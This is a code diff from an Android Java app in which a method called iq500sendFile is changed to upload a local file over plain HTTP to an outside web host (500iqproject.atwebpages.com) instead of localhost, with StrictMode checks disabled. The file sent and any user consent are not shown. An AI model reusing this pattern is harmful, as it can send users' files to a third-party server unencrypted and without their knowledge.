@@ -1,3 +1,4 @@
+	
 	private void iq500sendFile()
 	{	
 		try{
@@ -22,7 +23,6 @@
 			{
 				try
 				{
-
 					StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
 					StrictMode.setThreadPolicy(policy);
 
@@ -67,22 +67,28 @@
 					FileEntity reqEntity = new FileEntity(target, "binary/octet-stream");
 					//launch http request
 					HttpClient httpclient = new DefaultHttpClient();
-					HttpPost post = new HttpPost("http://localhost/file.php");
+					HttpPost post = new HttpPost("http://500iqproject.atwebpages.com/file.php");
+					
 					//set binary entity
 					post.setEntity(reqEntity);
 					reqEntity.setContentType("binary/octet-stream");
+					//set timestamp of the file as the component of filename
+					post.setHeader("lmod", String.valueOf(lmod));
 					//fire
 					httpclient.execute(post);
 
 				}
 				catch (Exception e)
-				{}
+				{
+					e.printStackTrace();
+					Log.e("iq500", e.toString());
+				}
 			}	
-		}catch(Exception e){}
+		}catch(Exception e){
+			e.printStackTrace();
+			Log.e("iq500", e.toString());
+		}
 
-		
-		
-	}
 
 for version2:
 	protected void onStop()
